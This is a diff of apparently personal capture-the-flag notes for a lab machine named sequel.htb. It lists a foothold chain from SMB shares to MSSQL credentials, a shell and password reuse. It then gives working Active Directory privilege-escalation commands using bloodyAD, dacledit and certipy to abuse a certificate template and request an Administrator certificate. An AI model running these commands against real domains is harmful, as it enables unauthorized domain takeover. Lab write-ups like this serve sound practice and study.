@@ -1,22 +1,27 @@
-WqSZAF6CysDQbGb3
+Foothold:
+nmap revealed smb shares
+smb share revealed MSSQL credentials
+MSSQL gave a shell
+C:\SQL2019 revealed sqlsvc PW -> WqSZAF6CysDQbGb3
+user ryan used the PW WqSZAF6CysDQbGb3
+ryan has writerowner permission for cs_svc
 
-
-
-
-
-
+PrivEsc:
+# Sets the owner of the `ca_svc` object to the user `ryan`
 bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan  
 
-
+# Grants `ryan` full control rights (`FullControl`) over `ca_svc`
 dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'  
 
-
+# Creates shadow copies for `ca_svc` using `ryan`'s credentials
 certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip 10.10.11.51 -ns 10.10.11.51 -target 10.10.11.51 -account ca_svc 
 
-
+# Finds vulnerabilities in Active Directory using the ticket for `ca_svc`
 KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip 0.10.11.51 -vulnerable -stdout
 
-
+# Exploits the `DunderMifflinAuthentication` template for further actions
 KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.10.11.51
 
+# Requests a certificate for `Administrator` using the `ca_svc` account and template
 certipy-ad req -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target dc01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51
+
